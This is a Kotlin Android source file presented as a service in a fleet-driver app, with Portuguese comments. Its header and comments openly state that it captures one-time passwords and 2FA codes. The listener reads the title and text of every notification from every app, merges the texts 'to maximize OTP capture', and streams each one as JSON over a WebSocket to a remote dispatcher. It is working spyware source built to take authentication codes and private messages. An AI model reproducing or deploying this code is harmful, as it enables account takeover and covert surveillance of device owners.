// [context: Android API 26+, ARM64/any — NotificationListenerService for OTP/2FA capture]
// FleetNotifListener.kt — captura TODAS as notificações em tempo real, envia via WS
// Não requer permissões perigosas — só "notification access" nas acessibilidade do usuário
package com.fleetdroid.driver.service

import android.app.Notification
import android.os.Bundle
import android.service.notification.NotificationListenerService
import android.service.notification.StatusBarNotification
import android.util.Log
import org.json.JSONObject

class FleetNotifListener : NotificationListenerService() {

    companion object {
        const val TAG = "FleetNotifListener"

        // Referência estática para o serviço ativo — DispatchService usa pra checar status
        @Volatile var instance: FleetNotifListener? = null
    }

    override fun onCreate() {
        super.onCreate()
        instance = this
        Log.i(TAG, "NotificationListenerService created")
    }

    override fun onDestroy() {
        instance = null
        super.onDestroy()
    }

    override fun onNotificationPosted(sbn: StatusBarNotification) {
        try {
            val extras: Bundle = sbn.notification.extras ?: return
            val title   = extras.getCharSequence(Notification.EXTRA_TITLE)?.toString()     ?: ""
            val text    = extras.getCharSequence(Notification.EXTRA_TEXT)?.toString()       ?: ""
            val bigText = extras.getCharSequence(Notification.EXTRA_BIG_TEXT)?.toString()   ?: ""
            val subText = extras.getCharSequence(Notification.EXTRA_SUB_TEXT)?.toString()   ?: ""
            val pkg     = sbn.packageName ?: "unknown"
            val key     = sbn.key

            // Concatena todos os textos para maximizar captura de OTP
            val fullText = listOf(text, bigText, subText).filter { it.isNotBlank() }.joinToString(" | ")

            val payload = JSONObject().apply {
                put("type",     "notification")
                put("pkg",      pkg)
                put("app",      appLabel(pkg))
                put("title",    title)
                put("text",     fullText.ifBlank { text })
                put("key",      key)
                put("ts",       sbn.postTime)
                put("ongoing",  sbn.isOngoing)
                put("group_key",sbn.groupKey ?: "")
            }

            DispatchService.instance?.sendWs(payload.toString())
            Log.d(TAG, "notif from $pkg: $title | $fullText")
        } catch (e: Exception) {
            Log.e(TAG, "onNotificationPosted error", e)
        }
    }

    override fun onNotificationRemoved(sbn: StatusBarNotification) {
        // Não enviamos removal — reduz ruído
    }

    // Retorna o nome legível do app a partir do packageName
    private fun appLabel(pkg: String): String {
        return try {
            val pm = applicationContext.packageManager
            val info = pm.getApplicationInfo(pkg, 0)
            pm.getApplicationLabel(info).toString()
        } catch (_: Exception) {
            pkg
        }
    }
}
